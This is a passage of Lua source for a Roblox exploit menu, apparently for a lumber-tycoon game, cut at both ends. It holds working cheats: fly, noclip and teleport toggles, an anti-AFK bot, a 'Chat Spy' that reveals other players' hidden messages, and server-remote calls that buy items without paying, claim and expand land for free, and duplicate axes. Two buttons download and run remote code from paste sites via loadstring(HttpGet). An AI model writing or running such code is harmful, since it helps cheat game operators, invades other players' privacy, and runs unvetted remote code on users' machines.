JumpPower.MouseButton1Down:connect(function()
Jump = JumpText.Text
end)

player.Character.Humanoid.JumpPower = Jump

player.Character.Humanoid.Changed:connect(function()
player.Character.Humanoid.JumpPower = Jump

end)

FlyOn = Instance.new("TextButton")
FlyOn.Name = "FlyOn"
FlyOn.Parent = PlayerFrame
FlyOn.BackgroundColor3 = Color3.new(0, 0, 0)
FlyOn.BackgroundTransparency = 0.6
FlyOn.BorderColor3 = Color3.new(1, 0, 0)
FlyOn.Position = UDim2.new(0, 3, 0, 74)
FlyOn.Size = UDim2.new(0, 80, 0, 20)
FlyOn.Font = Enum.Font.Fantasy
FlyOn.Text = "Fly On"
FlyOn.TextColor3 = Color3.new(1, 1, 1)
FlyOn.TextSize = 14

FlyOff = Instance.new("TextButton")
FlyOff.Name = "FlyOff"
FlyOff.Parent = PlayerFrame
FlyOff.BackgroundColor3 = Color3.new(0, 0, 0)
FlyOff.BackgroundTransparency = 0.6
FlyOff.BorderColor3 = Color3.new(1, 0, 0)
FlyOff.BorderSizePixel = 0
FlyOff.Position = UDim2.new(0, 86, 0, 74)
FlyOff.Size = UDim2.new(0, 83, 0, 20)
FlyOff.Font = Enum.Font.Fantasy
FlyOff.Text = "Fly Off"
FlyOff.TextColor3 = Color3.new(1, 1, 1)
FlyOff.TextSize = 14

FlyOn.MouseButton1Click:connect(function()
	Fly = true
  local mouse=game.Players.LocalPlayer:GetMouse''
  localplayer=game.Players.LocalPlayer
  game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
  local torso = game.Players.LocalPlayer.Character.HumanoidRootPart
  local speed=0
  local keys={a=false,d=false,w=false,s=false} 
  local e1
  local e2
  local function start()
   local pos = Instance.new("BodyPosition",torso)
   local gyro = Instance.new("BodyGyro",torso)
   pos.Name="EPIXPOS"
   pos.maxForce = Vector3.new(math.huge, math.huge, math.huge)
   pos.position = torso.Position
   gyro.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
   gyro.cframe = torso.CFrame
   repeat
    wait()
    localplayer.Character.Humanoid.PlatformStand=true
    local new=gyro.cframe - gyro.cframe.p + pos.position
    if not keys.w and not keys.s and not keys.a and not keys.d then
     speed=1
    end 
    if keys.w then 
     new = new + workspace.CurrentCamera.CoordinateFrame.lookVector * speed
     speed=speed+0.02
    end
    if keys.s then 
     new = new - workspace.CurrentCamera.CoordinateFrame.lookVector * speed
     speed=speed+0.02
    end
    if keys.d then 
     new = new * CFrame.new(speed,0,0)
     speed=speed+0.02
    end
    if keys.a then 
     new = new * CFrame.new(-speed,0,0)
     speed=speed+0.02
    end
    if speed>5 then
     speed=5.5
    end
    pos.position=new.p
    if keys.w then
     gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(-math.rad(speed*15),0,0)
    elseif keys.s then
     gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(math.rad(speed*15),0,0)
    else
     gyro.cframe = workspace.CurrentCamera.CoordinateFrame
    end
   until not Fly
   if gyro then gyro:Destroy() end
   if pos then pos:Destroy() end
   flying=false
   localplayer.Character.Humanoid.PlatformStand=false
   speed=0
  end
  e1=mouse.KeyDown:connect(function(key)
   if not torso or not torso.Parent then flying=false e1:disconnect() e2:disconnect() return end
   if key=="w" then
    keys.w=true
   elseif key=="s" then
    keys.s=true
   elseif key=="a" then
    keys.a=true
   elseif key=="d" then
    keys.d=true
   end
  end)
  e2=mouse.KeyUp:connect(function(key)
   if key=="w" then
    keys.w=false
   elseif key=="s" then
    keys.s=false
   elseif key=="a" then
    keys.a=false
   elseif key=="d" then
    keys.d=false
   end
  end)
  start()
end)

FlyOff.MouseButton1Click:connect(function()
	Fly = false
end)

Noclip = Instance.new("TextButton")
Noclip.Name = "SetPosition"
Noclip.Parent = PlayerFrame
Noclip.BackgroundColor3 = Color3.new(0, 0, 0)
Noclip.BackgroundTransparency = 0.69999998807907
Noclip.BorderColor3 = Color3.new(1, 0, 0)
Noclip.Position = UDim2.new(0, 5, 0, 97)
Noclip.Size = UDim2.new(0, 80, 0, 20)
Noclip.Font = Enum.Font.Fantasy
Noclip.Text = "Noclip"
Noclip.TextColor3 = Color3.new(1, 1, 1)
Noclip.TextSize = 14
noclip = false
game:GetService('RunService').Stepped:connect(function()
if noclip then
game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
Noclip.BackgroundColor3 = Color3.fromRGB(91, 154, 76)
--Noclip.TextColor3 = Color3.new(0, 1, 0)
Noclip.Text = "No Clip On"
end
end)
Noclip.MouseButton1Down:connect(function()
noclip = not noclip
Noclip.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
--Noclip.TextColor3 = Color3.new(0.7, 0, 0)
Noclip.Text = "No Clip Off"
end)

ClickTP = Instance.new("TextButton")
ClickTP.Name = "ClickTP"
ClickTP.Parent = PlayerFrame
ClickTP.BackgroundColor3 = Color3.new(0, 0, 0)
ClickTP.BackgroundTransparency = 0.69999998807907
ClickTP.BorderColor3 = Color3.new(1, 0, 0)
ClickTP.Position = UDim2.new(0, 86, 0, 97)
ClickTP.Size = UDim2.new(0, 83, 0, 20)
ClickTP.Font = Enum.Font.Fantasy
ClickTP.Text = "ClickTP"
ClickTP.TextColor3 = Color3.new(1, 1, 1)
ClickTP.TextSize = 14
ClickTP.MouseButton1Click:Connect(function()
    mouse = game.Players.LocalPlayer:GetMouse()
tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "Click Teleport"
tool.Activated:connect(function()
local pos = mouse.Hit+Vector3.new(0,2.5,0)
pos = CFrame.new(pos.X,pos.Y,pos.Z)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
end)
tool.Parent = game.Players.LocalPlayer.Backpack
end)

AntiAFKtime = Instance.new("TextLabel")
AntiAFKtime.Name = "AntiAFKtime"
AntiAFKtime.Parent = PlayerFrame
AntiAFKtime.BackgroundColor3 = Color3.new(0, 0, 0)
AntiAFKtime.BackgroundTransparency = 0.69999998807907
AntiAFKtime.BorderColor3 = Color3.new(1, 0, 0)
AntiAFKtime.Position =  UDim2.new(0, 3, 0, 120)
AntiAFKtime.Size = UDim2.new(0, 165, 0, 20)
AntiAFKtime.Font = Enum.Font.Fantasy
AntiAFKtime.Text = "AFK for: 0 Seconds"
AntiAFKtime.TextColor3 = Color3.new(0, 1, 0)
AntiAFKtime.TextSize = 14

AntiAFK = Instance.new("TextButton")
AntiAFK.Name = "AntiAFK"
AntiAFK.Parent = PlayerFrame
AntiAFK.BackgroundColor3 = Color3.new(0, 0, 0)
AntiAFK.BackgroundTransparency = 0.69999998807907
AntiAFK.BorderColor3 = Color3.new(1, 0, 0)
AntiAFK.Position =  UDim2.new(0, 3, 0, 143)
AntiAFK.Size = UDim2.new(0, 165, 0, 20)
AntiAFK.Font = Enum.Font.Fantasy
AntiAFK.Text = "Start Anti-AFK Mode"
AntiAFK.TextColor3 = Color3.new(0, 1, 0)
AntiAFK.TextSize = 14
AntiAFK.MouseButton1Down:Connect(function()
  makesound("rbxassetid://156785206")
    if afkactive == true then
        afkactive = false
		AntiAFK.BackgroundColor3 = Color3.new(0, 0, 0)
                                          AntiAFKtime.TextColor3 = Color3.new(0, 1, 0)
		AntiAFK.Text = "Start Anti-AFK Mode"
    elseif afkactive == false then
        afkactive = true
		AntiAFK.BackgroundColor3 = Color3.new(0, 0, 0)
		AntiAFKtime.TextColor3 = Color3.new(255, 0, 0)
		AntiAFK.Text = "Stop Anti-AFK Mode"

        logtime = coroutine.wrap(function()
			afktotaltime=0
			while afkactive == true do
				wait(1)
				afktotaltime=afktotaltime+1
				AntiAFKtime.Text = "AFK for: "..afktotaltime.." Seconds"
			end
		end)
	
        messageBot = coroutine.wrap(function()
			while afkactive == true do
				wait(900)
				possiblechats = {"afk", "brb", "I'm AFK"}
				decide=math.random(1,#possiblechats)
				game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(possiblechats[decide], "All")
				game.Players:Chat("/e point")
			end
		end)
		
	    moveChar = coroutine.wrap(function()
			plr = game:service'Players'.LocalPlayer
			char = plr.Character
			hum = char:FindFirstChildOfClass'Humanoid'
            while afkactive==true do
				wait(1)
				hum:Move(Vector3.new(1, 0, 0), false)
				wait(1)
				hum:Move(Vector3.new(-1, 0, 0), false)
				wait(1)
				hum:Move(Vector3.new(1, 0, 0), false)
				wait(1)
				hum:Move(Vector3.new(-1, 0, 0), false)
				wait(1)
				hum:Move(Vector3.new(0, 1, 0), false)
				wait(1)
				hum:Move(Vector3.new(0, 1, 0), false)
				wait(60)
			end
        end)
	
        logtime()
        moveChar()
        messageBot()

	end
end)

ChatSpy = Instance.new("TextButton")
ChatSpy.Name = "ChatSpy"
ChatSpy.Parent = PlayerFrame
ChatSpy.BackgroundColor3 = Color3.new(0, 0, 0)
ChatSpy.BackgroundTransparency = 0.69999998807907
ChatSpy.BorderColor3 = Color3.new(1, 0, 0)
ChatSpy.Position =  UDim2.new(0, 3, 0, 166)
ChatSpy.Size = UDim2.new(0, 165, 0, 20)
ChatSpy.Font = Enum.Font.Fantasy
ChatSpy.Text = "Chat Spy"
ChatSpy.TextColor3 = Color3.new(1, 1, 1)
ChatSpy.TextSize = 14
ChatSpy.MouseButton1Down:connect(function()
--This script reveals ALL hidden messages in the default chat
--chat "/spy" to toggle!
enabled = true
--if true will check your messages too
spyOnMyself = true
--if true will chat the logs publicly (fun, risky)
public = false
--if true will use /me to stand out
publicItalics = true
--customize private logs
privateProperties = {
	Color = Color3.fromRGB(0,255,255); 
	Font = Enum.Font.SourceSansBold;
	TextSize = 18;
}
--////////////////////////////////////////////////////////////////
local StarterGui = game:GetService("StarterGui")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
local instance = (_G.chatSpyInstance or 0) + 1
_G.chatSpyInstance = instance

local function onChatted(p,msg)
	if _G.chatSpyInstance == instance then
		if p==player and msg:lower():sub(1,4)=="/spy" then
			enabled = not enabled
			wait(0.3)
			privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
			StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
		elseif enabled and (spyOnMyself==true or p~=player) then
			msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
			local hidden = true
			local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
				if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and Players[packet.FromSpeaker].Team==player.Team)) then
					hidden = false
				end
			end)
			wait(1)
			conn:Disconnect()
			if hidden and enabled then
				if public then
					saymsg:FireServer((publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
				else
					privateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
					StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
				end
			end
		end
	end
end

for _,p in ipairs(Players:GetPlayers()) do
	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end
Players.PlayerAdded:Connect(function(p)
	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end)
privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
local chatFrame = player.PlayerGui.Chat.Frame
chatFrame.ChatChannelParentFrame.Visible = true
chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)

end)

PayBridge = Instance.new("TextButton")
PayBridge.Name = "PayBridge"
PayBridge.Parent = PlayerFrame
PayBridge.BackgroundColor3 = Color3.new(0, 0, 0)
PayBridge.BackgroundTransparency = 0.69999998807907
PayBridge.BorderColor3 = Color3.new(1, 0, 0)
PayBridge.Position =  UDim2.new(0, 3, 0, 189)
PayBridge.Size = UDim2.new(0, 165, 0, 20)
PayBridge.Font = Enum.Font.Fantasy
PayBridge.Text = "Bridge Down $100"
PayBridge.TextColor3 = Color3.new(1, 1, 1)
PayBridge.TextSize = 14
PayBridge.MouseButton1Down:connect(function()
for i=1,3 do
local A_1 = 
{
    ["Character"] = game:GetService("Workspace").Bridge.TollBooth0.Seranok, 
    ["Name"] = "Seranok", 
    ["ID"] = 7, 
    ["Dialog"] = game:GetService("Workspace").Bridge.TollBooth0.Seranok.Dialog
}
local A_2 = "ConfirmPurchase"
local Event = game:GetService("ReplicatedStorage").NPCDialog.PlayerChatted
Event:InvokeServer(A_1, A_2)
end
end)

PayPowers = Instance.new("TextButton")
PayPowers.Name = "PayPowers"
PayPowers.Parent = PlayerFrame
PayPowers.BackgroundColor3 = Color3.new(0, 0, 0)
PayPowers.BackgroundTransparency = 0.69999998807907
PayPowers.BorderColor3 = Color3.new(1, 0, 0)
PayPowers.Position =  UDim2.new(0, 3, 0, 212)
PayPowers.Size = UDim2.new(0, 165, 0, 20)
PayPowers.Font = Enum.Font.Fantasy
PayPowers.Text = "Powers $10,009,000"
PayPowers.TextColor3 = Color3.new(1, 1, 1)
PayPowers.TextSize = 14
PayPowers.MouseButton1Down:connect(function()
local A_1 = 
{
    ["Character"] = game.Workspace.Region_Main["Strange Man"], 
    ["Name"] = "Strange Man", 
    ["ID"] = 2, 
    ["Dialog"] = game:GetService("Workspace").Stores.WoodRUs.Thom.Dialog
}
local A_2 = "ConfirmPurchase"
local Event = game:GetService("ReplicatedStorage").NPCDialog.PlayerChatted
Event:InvokeServer(A_1, A_2)
end)

Fog = Instance.new("TextButton")
Fog.Name = "Fog"
Fog.Parent = PlayerFrame
Fog.BackgroundColor3 = Color3.new(0, 0, 0)
Fog.BackgroundTransparency = 0.69999998807907
Fog.BorderColor3 = Color3.new(1, 0, 0)
Fog.Position =  UDim2.new(0, 3, 0, 235)
Fog.Size = UDim2.new(0, 165, 0, 20)
Fog.Font = Enum.Font.Fantasy
Fog.Text = "Remove Fog"
Fog.TextColor3 = Color3.new(1, 1, 1)
Fog.TextSize = 14
Fog.MouseButton1Down:connect(function()
  makesound("rbxassetid://156785206")
	Fog.BackgroundColor3 = Color3.new(0, 0, 0)
                      Fog.TextColor3 = Color3.new(0, 1, 0)
game.Lighting.Changed:connect(function()
	game.Lighting.TimeOfDay = "12:00:00"
	game.Lighting.FogEnd = 9999
	game.Lighting.Brightness = 2
end)
end)

ReJoinServer = Instance.new("TextButton")
ReJoinServer.Name = "ReJoinServer"
ReJoinServer.Parent = PlayerFrame
ReJoinServer.BackgroundColor3 = Color3.new(0, 0, 0)
ReJoinServer.BackgroundTransparency = 0.69999998807907
ReJoinServer.BorderColor3 = Color3.new(1, 0, 0)
ReJoinServer.Position =  UDim2.new(0, 3, 0, 258)
ReJoinServer.Size = UDim2.new(0, 165, 0, 20)
ReJoinServer.Font = Enum.Font.Fantasy
ReJoinServer.Text = "ReJoin Server"
ReJoinServer.TextColor3 = Color3.new(1, 1, 1)
ReJoinServer.TextSize = 14
ReJoinServer.MouseButton1Down:connect(function()
  makesound("rbxassetid://156785206")
	local placeId = "13822889"
	game:GetService("TeleportService"):Teleport(placeId)
end)

Reset = Instance.new("TextButton")
Reset.Name = "Reset"
Reset.Parent = PlayerFrame
Reset.BackgroundColor3 = Color3.new(0, 0, 0)
Reset.BackgroundTransparency = 0.69999998807907
Reset.BorderColor3 = Color3.new(1, 0, 0)
Reset.Position =  UDim2.new(0, 3, 0, 281)
Reset.Size = UDim2.new(0, 165, 0, 20)
Reset.Font = Enum.Font.Fantasy
Reset.Text = "Reset Character"
Reset.TextColor3 = Color3.new(1, 1, 1)
Reset.TextSize = 14
Reset.MouseButton1Click:connect(function()
  makesound("rbxassetid://156785206")
	game.Players.LocalPlayer.Character.Head:Destroy()
end)

Base2Title = Instance.new("TextLabel")
Base2Title.Name = "Base1Title"
Base2Title.Parent = PlayerFrame
Base2Title.BackgroundColor3 = Color3.new(1, 0, 0)
Base2Title.BackgroundTransparency = 0.10000000149012
Base2Title.BorderSizePixel = 0
Base2Title.Position = UDim2.new(0, 3, 0, 307)
Base2Title.Size = UDim2.new(0, 160, 0, 20)
Base2Title.Font = Enum.Font.Fantasy
Base2Title.Text = "Dupe Axes"
Base2Title.TextColor3 = Color3.new(1, 1, 1)
Base2Title.TextSize = 14

DupeAxe = Instance.new("TextButton")
DupeAxe.Name = "Reset"
DupeAxe.Parent = PlayerFrame
DupeAxe.BackgroundColor3 = Color3.new(0, 0, 0)
DupeAxe.BackgroundTransparency = 0.69999998807907
DupeAxe.BorderColor3 = Color3.new(1, 0, 0)
DupeAxe.Position =  UDim2.new(0, 4, 0, 330)
DupeAxe.Size = UDim2.new(0, 165, 0, 20)
DupeAxe.Font = Enum.Font.Fantasy
DupeAxe.Text = "Dupe Axes"
DupeAxe.TextColor3 = Color3.new(1, 1, 1)
DupeAxe.TextSize = 14
DupeAxe.MouseButton1Click:connect(function()
  makesound("rbxassetid://156785206")
loadstring(game:HttpGet("http://m.uploadedit.com/bltc/1590067241770.txt"))();
dupeaxes()
end)

Base1Title = Instance.new("TextLabel")
Base1Title.Name = "Base1Title"
Base1Title.Parent = PlayerFrame
Base1Title.BackgroundColor3 = Color3.new(1, 0, 0)
Base1Title.BackgroundTransparency = 0.10000000149012
Base1Title.BorderSizePixel = 0
Base1Title.Position = UDim2.new(0, 200, 0, 150)
Base1Title.Size = UDim2.new(0, 160, 0, 20)
Base1Title.Font = Enum.Font.Fantasy
Base1Title.Text = "Base Tools"
Base1Title.TextColor3 = Color3.new(1, 1, 1)
Base1Title.TextSize = 14

BluePrints = Instance.new("TextButton")
BluePrints.Name = "BluePrints"
BluePrints.Parent = PlayerFrame
BluePrints.BackgroundColor3 = Color3.new(0, 0, 0)
BluePrints.BackgroundTransparency = 0.69999998807907
BluePrints.BorderColor3 = Color3.new(1, 0, 0)
BluePrints.Position = UDim2.new(0, 200, 0, 173)
BluePrints.Size = UDim2.new(0, 160, 0, 20)
BluePrints.Font = Enum.Font.Fantasy
BluePrints.Text = "BluePrints"
BluePrints.TextColor3 = Color3.new(1, 1, 1)
BluePrints.TextSize = 14
BluePrints.MouseButton1Down:connect(function()
  makesound("rbxassetid://156785206")
for i,v in pairs(game.ReplicatedStorage.Purchasables.Structures.BlueprintStructures:GetChildren()) do
if not game.Players.LocalPlayer.PlayerBlueprints.Blueprints:FindFirstChild(v.Name) then
local clone = v:Clone()
clone.Parent = game.Players.LocalPlayer.PlayerBlueprints.Blueprints
end
end
end)

FreeLand = Instance.new("TextButton")
FreeLand.Name = "FreeLand"
FreeLand.Parent = PlayerFrame
FreeLand.BackgroundColor3 = Color3.new(0, 0, 0)
FreeLand.BackgroundTransparency = 0.69999998807907
FreeLand.BorderColor3 = Color3.new(1, 0, 0)
FreeLand.Position = UDim2.new(0, 200, 0, 196)
FreeLand.Size = UDim2.new(0, 160, 0, 20)
FreeLand.Font = Enum.Font.Fantasy
FreeLand.Text = "Free Land"
FreeLand.TextColor3 = Color3.new(1, 1, 1)
FreeLand.TextSize = 14
FreeLand.MouseButton1Down:connect(function()
for a,b in pairs(workspace.Properties:GetChildren()) do 
    if b:FindFirstChild("Owner") and b:FindFirstChild("OriginSquare") and b.Owner.Value == nil then 
        game.ReplicatedStorage.PropertyPurchasing.ClientPurchasedProperty:FireServer(b, b.OriginSquare.OriginCFrame.Value.p + Vector3.new(0,3,0))
 wait(0.5)
        Instance.new('RemoteEvent', game:service'ReplicatedStorage'.Interaction).Name = "Ban"
	for i,v in pairs(game.Workspace.Properties:GetChildren()) do
		if v.Owner.Value == game.Players.LocalPlayer then
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
    wait(0.1)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.OriginSquare.CFrame + Vector3.new(0,10,0)
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
    wait(0.1)
		end
	end

  --     game.Players.LocalPlayer.Character:MoveTo(b.OriginSquare.Position)
        break
    end
end
end)

MaxLand = Instance.new("TextButton")
MaxLand.Name = "MaxLand"
MaxLand.Parent = PlayerFrame
MaxLand.BackgroundColor3 = Color3.new(0, 0, 0)
MaxLand.BackgroundTransparency = 0.69999998807907
MaxLand.BorderColor3 = Color3.new(1, 0, 0)
MaxLand.Position = UDim2.new(0, 200, 0, 219)
MaxLand.Size = UDim2.new(0, 160, 0, 20)
MaxLand.Font = Enum.Font.Fantasy
MaxLand.Text = "MaxLand"
MaxLand.TextColor3 = Color3.new(1, 1, 1)
MaxLand.TextSize = 14
MaxLand.MouseButton1Down:connect(function()
  makesound("rbxassetid://156785206")
for i, v in pairs(game:GetService("Workspace").Properties:GetChildren()) do
		if v:FindFirstChild("Owner") and v.Owner.Value == game.Players.LocalPlayer then
			base = v
			square = v.OriginSquare
			end
		end
	function makebase(pos)
		local Event = game:GetService("ReplicatedStorage").PropertyPurchasing.ClientExpandedProperty
		Event:FireServer(base, pos)
		end
	spos = square.Position
	makebase(CFrame.new(spos.X + 40, spos.Y, spos.Z))
	makebase(CFrame.new(spos.X - 40, spos.Y, spos.Z))
	makebase(CFrame.new(spos.X, spos.Y, spos.Z + 40))
	makebase(CFrame.new(spos.X, spos.Y, spos.Z - 40))
	makebase(CFrame.new(spos.X + 40, spos.Y, spos.Z + 40))
	makebase(CFrame.new(spos.X + 40, spos.Y, spos.Z - 40))
	makebase(CFrame.new(spos.X - 40, spos.Y, spos.Z + 40))
	makebase(CFrame.new(spos.X - 40, spos.Y, spos.Z - 40))
	makebase(CFrame.new(spos.X + 80, spos.Y, spos.Z))
	makebase(CFrame.new(spos.X - 80, spos.Y, spos.Z))
	makebase(CFrame.new(spos.X, spos.Y, spos.Z + 80))
	makebase(CFrame.new(spos.X, spos.Y, spos.Z - 80))
--Corners--
	makebase(CFrame.new(spos.X + 80, spos.Y, spos.Z + 80))
	makebase(CFrame.new(spos.X + 80, spos.Y, spos.Z - 80))
	makebase(CFrame.new(spos.X - 80, spos.Y, spos.Z + 80))
	makebase(CFrame.new(spos.X - 80, spos.Y, spos.Z - 80))
--Corners--
	makebase(CFrame.new(spos.X + 40, spos.Y, spos.Z + 80))
	makebase(CFrame.new(spos.X - 40, spos.Y, spos.Z + 80))
	makebase(CFrame.new(spos.X + 80, spos.Y, spos.Z + 40))
	makebase(CFrame.new(spos.X + 80, spos.Y, spos.Z - 40))
	makebase(CFrame.new(spos.X - 80, spos.Y, spos.Z + 40))
	makebase(CFrame.new(spos.X - 80, spos.Y, spos.Z - 40))
	makebase(CFrame.new(spos.X + 40, spos.Y, spos.Z - 80))
	makebase(CFrame.new(spos.X - 40, spos.Y, spos.Z - 80))

end)

WipeBase = Instance.new("TextButton")
WipeBase.Name = "WipeBase"
WipeBase.Parent = PlayerFrame
WipeBase.BackgroundColor3 = Color3.new(0, 0, 0)
WipeBase.BackgroundTransparency = 0.69999998807907
WipeBase.BorderColor3 = Color3.new(1, 0, 0)
WipeBase.Position = UDim2.new(0, 200, 0, 242)
WipeBase.Size = UDim2.new(0, 160, 0, 20)
WipeBase.Font = Enum.Font.Fantasy
WipeBase.Text = "Clear Entire Base"
WipeBase.TextColor3 = Color3.new(1, 1, 1)
WipeBase.TextSize = 14
WipeBase.MouseButton1Down:Connect(function()
  makesound("rbxassetid://156785206")
for i,v in pairs(game.Workspace.PlayerModels:GetChildren()) do
if v:FindFirstChild("Owner") and v:FindFirstChild("Type") and v.Owner.Value == game.Players.LocalPlayer then
local A_1 = v
local Event = game:GetService("ReplicatedStorage").Interaction.DestroyStructure
Event:FireServer(A_1)
end
end
end)

InfoText30 = Instance.new("TextLabel")
InfoText30.Name = "InfoText2"
InfoText30.Parent = PlayerFrame
InfoText30.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
InfoText30.BorderColor3 = Color3.new(0, 0, 0)
InfoText30.BackgroundTransparency = 0
InfoText30.Position = UDim2.new(0, 23, 0, 310)
InfoText30.Size = UDim2.new(0, 150, 0, 150)
InfoText30.TextColor3 = Color3.fromRGB(245, 205, 48)
InfoText30.Font = Enum.Font.Fantasy
InfoText30.Text =  "Wipe Base\n\nThis will delete everything on your base you have been warrned."
InfoText30.TextSize = 14
InfoText30.TextWrapped = true
InfoText30.Visible = false

WipeBase.MouseEnter:connect(function()
InfoText30.Visible = true
AIntroImage2.Visible = false
AIntroImage3.Visible = false
end)

WipeBase.MouseLeave:connect(function()
InfoText30.Visible = false
AIntroImage2.Visible = true
AIntroImage3.Visible = true
end)

CBlueprint = Instance.new("TextButton")
CBlueprint.Name = "CBlueprint"
CBlueprint.Parent = PlayerFrame
CBlueprint.BackgroundColor3 = Color3.new(0, 0, 0)
CBlueprint.BackgroundTransparency = 0.69999998807907
CBlueprint.BorderColor3 = Color3.new(1, 0, 0)
CBlueprint.Position = UDim2.new(0, 200, 0, 265)
CBlueprint.Size = UDim2.new(0, 160, 0, 20)
CBlueprint.Font = Enum.Font.Fantasy
CBlueprint.Text = "Clear Blueprints"
CBlueprint.TextColor3 = Color3.new(1, 1, 1)
CBlueprint.TextSize = 14
CBlueprint.MouseButton1Down:Connect(function()
  makesound("rbxassetid://156785206")
for i,v in pairs(game.Workspace.PlayerModels:GetChildren()) do
if v:FindFirstChild("Owner") and v:FindFirstChild("Type") and v.Owner.Value == game.Players.LocalPlayer then
	if v.Type.Value == "Blueprint" then
local A_1 = v
local Event = game:GetService("ReplicatedStorage").Interaction.DestroyStructure
Event:FireServer(A_1)
end
end
end
end)

InfoText37 = Instance.new("TextLabel")
InfoText37.Name = "InfoText2"
InfoText37.Parent = PlayerFrame
InfoText37.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
InfoText37.BorderColor3 = Color3.new(0, 0, 0)
InfoText37.BackgroundTransparency = 0
InfoText37.Position = UDim2.new(0, 23, 0, 310)
InfoText37.Size = UDim2.new(0, 150, 0, 150)
InfoText37.TextColor3 = Color3.fromRGB(245, 205, 48)
InfoText37.Font = Enum.Font.Fantasy
InfoText37.Text =  "Wipe Base\n\nThis will delete all unfilled  Blueprints on your base you have been warrned."
InfoText37.TextSize = 14
InfoText37.TextWrapped = true
InfoText37.Visible = false


CBlueprint.MouseEnter:connect(function()
InfoText37.Visible = true
AIntroImage2.Visible = false
AIntroImage3.Visible = false
end)

CBlueprint.MouseLeave:connect(function()
InfoText37.Visible = false
AIntroImage2.Visible = true
AIntroImage3.Visible = true
end)


CStructure = Instance.new("TextButton")
CStructure.Name = "CStructure"
CStructure.Parent = PlayerFrame
CStructure.BackgroundColor3 = Color3.new(0, 0, 0)
CStructure.BackgroundTransparency = 0.69999998807907
CStructure.BorderColor3 = Color3.new(1, 0, 0)
CStructure.Position = UDim2.new(0, 200, 0, 288)
CStructure.Size = UDim2.new(0, 160, 0, 20)
CStructure.Font = Enum.Font.Fantasy
CStructure.Text = "Clear Structures"
CStructure.TextColor3 = Color3.new(1, 1, 1)
CStructure.TextSize = 14
CStructure.MouseButton1Down:Connect(function()
  makesound("rbxassetid://156785206")
for i,v in pairs(game.Workspace.PlayerModels:GetChildren()) do
if v:FindFirstChild("Owner") and v:FindFirstChild("Type") and v.Owner.Value == game.Players.LocalPlayer then
	if v.Type.Value == "Structure" or v.Type.Value == "Furniture" then
local A_1 = v
local Event = game:GetService("ReplicatedStorage").Interaction.DestroyStructure
Event:FireServer(A_1)
end
end
end
end)

InfoText38 = Instance.new("TextLabel")
InfoText38.Name = "InfoText2"
InfoText38.Parent = PlayerFrame
InfoText38.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
InfoText38.BorderColor3 = Color3.new(0, 0, 0)
InfoText38.BackgroundTransparency = 0
InfoText38.Position = UDim2.new(0, 23, 0, 310)
InfoText38.Size = UDim2.new(0, 150, 0, 150)
InfoText38.TextColor3 = Color3.fromRGB(245, 205, 48)
InfoText38.Font = Enum.Font.Fantasy
InfoText38.Text =  "Wipe Base\n\nThis will delete all Structure on your base you have been warrned."
InfoText38.TextSize = 14
InfoText38.TextWrapped = true
InfoText38.Visible = false


CStructure.MouseEnter:connect(function()
InfoText38.Visible = true
AIntroImage2.Visible = false
AIntroImage3.Visible = false
end)

CStructure.MouseLeave:connect(function()
InfoText38.Visible = false
AIntroImage2.Visible = true
AIntroImage3.Visible = true
end)

BToolALL = Instance.new("TextButton")
BToolALL.Name = "BToolALL"
BToolALL.Parent = PlayerFrame
BToolALL.BackgroundColor3 = Color3.new(0, 0, 0)
BToolALL.BackgroundTransparency = 0.69999998807907
BToolALL.BorderColor3 = Color3.new(1, 0, 0)
BToolALL.Position = UDim2.new(0, 200, 0, 311)
BToolALL.Size = UDim2.new(0, 160, 0, 20)
BToolALL.Font = Enum.Font.Fantasy
BToolALL.Text = "(CyclicaIIy) BTOOLS"
BToolALL.TextColor3 = Color3.new(1, 1, 1)
BToolALL.TextSize = 14
BToolALL.MouseButton1Down:Connect(function()
  makesound("rbxassetid://156785206")
loadstring(game:HttpGet(('https://pastebin.com/raw/a2nVDRVZ'),true))()

end)

DupeTitle = Instance.new("TextLabel")
DupeTitle.Name = "dupeTitle"
DupeTitle.Parent = PlayerFrame
DupeTitle.BackgroundColor3 = Color3.new(1, 0, 0)
DupeTitle.BackgroundTransparency = 0.10000000149012
DupeTitle.BorderSizePixel = 0
DupeTitle.Position = UDim2.new(0, 200, 0, 336)
DupeTitle.Size = UDim2.new(0, 160, 0, 20)
DupeTitle.Font = Enum.Font.Fantasy
DupeTitle.Text = "Dupe Tools"
DupeTitle.TextColor3 = Color3.new(1, 1, 1)
DupeTitle.TextSize = 14

ItemDupe = Instance.new("TextButton")
ItemDupe.Name = "ItemDupe"
ItemDupe.Parent = PlayerFrame
